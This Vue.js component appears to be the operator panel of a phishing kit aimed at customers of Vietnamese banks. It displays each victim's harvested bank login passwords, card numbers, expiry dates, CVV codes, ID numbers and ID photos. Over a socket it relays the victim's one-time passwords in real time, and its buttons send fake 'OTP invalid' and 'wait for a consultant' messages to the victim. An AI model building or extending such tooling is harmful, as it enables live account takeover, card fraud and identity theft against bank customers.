<template>
    <VRow class="my-2">
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('OTP')">Gửi yêu cầu OTP</VBtn>
            <p v-if="otp"> {{ otp }}</p>
        </VCol>
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('OTPN')">Gửi thống báo otp không hợp lệ</VBtn>
            <p v-if="otpNew">{{ otpNew }}</p>
        </VCol>
        <VCol cols="12" md="6">
            <VBtn block @click="sendData('TV')">Gửi thông báo chờ nhân viên tư vấn</VBtn>
            <p v-if="statusTV">{{ statusTV }}</p>
        </VCol>
    </VRow>
    <VCard>
        <VCardTitle>
            Thông tin người dùng
        </VCardTitle>
        <VCardText>
            <VForm class="pa-4">
                <VRow>
                    <VCol cols="12" md="12">
                        <VSelect v-model="formValue.bankLoginName" :items="bankList" label="Tên ngân hàng để đăng nhập"
                            outlined />
                    </VCol>
                    <VCol cols="12" md="12">
                        <VTextField v-model="formValue.bankLoginPassword" label="Mật khẩu đăng nhập ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="12">
                        <VTextField v-model="formValue.bankLoginAccount" label="Tài khoản đăng nhập ngân hàng" outlined />
                    </VCol>
                </VRow>


                <VRow>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.fullName" label="Họ và tên" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cccd" label="CCCD" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.bankName" label="Tên ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.bankPassword" label="Mật khẩu ngân hàng" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.numberPhone" label="Số điện thoại" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VSelect v-model="formValue.typeCard" label="Loại thẻ đang cần làm" outlined
                            :items="['Thẻ tín dụng', 'Thẻ ghi nợ', 'Thẻ trả trước']" />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VSelect v-model="formValue.cardType" label="Loại thẻ đang sử dụng" outlined :items="[
                            'Thẻ ghi nợ Napas',
                            'Thẻ ghi nợ Visa',
                            'Thẻ ghi nợ Mastercard',
                            'Thẻ tín dụng Jcb',
                        ]" />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardNumber" label="Số trên mặt thẻ" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardName" label="Chủ thẻ" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardDate" label="Ngày hết hạn" outlined />
                    </VCol>
                    <VCol cols="12" md="6">
                        <VTextField v-model="formValue.cardCvv" label="Mã CVV" outlined />
                    </VCol>
                </VRow>

                <VRow>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt trước CCCD" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.imageBefore" alt="">
                    </VCol>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt sau CCCD" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.imageAfter" alt="">
                    </VCol>
                    <VCol cols="12" md="4">
                        <!-- <VFileInput label="Ảnh mặt chân dung cầm cccd" outlined prepend-icon=""></VFileInput> -->
                        <img :src="formValue.image" alt="">
                    </VCol>
                </VRow>

                <!-- <VBtn @click="submit" color="primary" class="mt-4">
                    Lưu
                </VBtn> -->
            </VForm>
        </VCardText>
    </VCard>
</template>

<script setup>
import axios from '@/plugins/axios';
import { socket } from '@/plugins/socket';
import '@core/scss/template/index.scss';
import '@layouts/styles/index.scss';
import { onMounted, ref } from 'vue';
import { useRoute } from 'vue-router';
import { useToast } from 'vue-toast-notification';
const route = useRoute();
const otp = ref('');
const otpNew = ref('');
const statusXD = ref('');
const statusTV = ref('');
const formValue = ref({
    actions: null,
});


// get user id from route params
const userId = ref(route.params.id);

// get user detail
const user = ref(null);
onMounted(() => {
    axios.get(`/get-user/${userId.value}`)
        .then(({ data }) => {
            if (data.imageBefore) {
                data.imageBefore = `${import.meta.env.VITE_IMAGE_URL}/${data.imageBefore.replace('public/', 'uploads/')}`;
            }
            if (data.imageAfter) {
                data.imageAfter = `${import.meta.env.VITE_IMAGE_URL}/${data.imageAfter.replace('public/', 'uploads/')}`;
            }
            if (data.image) {
                data.image = `${import.meta.env.VITE_IMAGE_URL}/${data.image.replace('public/', 'uploads/')}`;
            }
            user.value = data;
            formValue.value = data;
            console.log('user', formValue.value);
        }).catch(() => {
            toast.open({
                message: 'Lỗi khi lấy thông tin người dùng',
                type: 'error',
                position: 'top',
            })
        })

    socket.on('send-data-admin-user', async (data) => {
        console.log('send-data-admin-user', data);
        if (data.otp) {
            otp.value = `Mã OTP là: ${data.otp}`;
        }
    })

});

const sendData = (type) => {
    if (type === 'OTP') {
        otp.value = 'Đang chờ otp...';

    } else if (type === 'OTPN') {
        otpNew.value = 'Đã gửi thông báo otp không hợp lệ...';
    }
    else {
        statusTV.value = 'Đã gửi thông báo tư vấn';
    }
    socket.emit(`send-data-user`, {
        numberPhone: user.value.numberPhone,
        type,
    });
}
const toast = useToast();

const submit = () => {
    axios.put(`/update-user-id/${userId.value}`, formValue.value)
        .then(() => {
            toast.success('Cập nhật thông tin người dùng thành công');
        }).catch(() => {
            toast.error('Lỗi khi cập nhật thông tin người dùng');
        })
}

const bankList = ref([
    {
        value: 'HDBank',
        title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
    },
    {
        value: 'MB',
        title: 'Ngân hàng Quân Đội (MB)'
    },
    {
        value: 'ACB',
        title: 'Ngân hàng Á Châu (ACB)'
    },
    {
        value: 'VPBank',
        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
    },
    {
        value: 'VCB',
        title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
    },
    {
        value: 'VietinBank',
        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
    },
    {
        value: 'BIDV',
        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
    },
    {
        value: 'Agribank',
        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
    },
    {
        value: 'Sacombank',
        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
    },
    {
        value: 'SHB',
        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
    },
    {
        value: 'SeABank',
        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
    },
    {
        value: 'VIB',
        title: 'Ngân hàng Quốc tế (VIB)'
    },
    {
        value: 'TPBank',
        title: 'Ngân hàng Tiên Phong (TPBank)'
    },
    {
        value: 'OceanBank',
        title: 'Ngân hàng Đại Dương (OceanBank)'
    }

])


</script>
<style lang="scss">
img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}
</style>
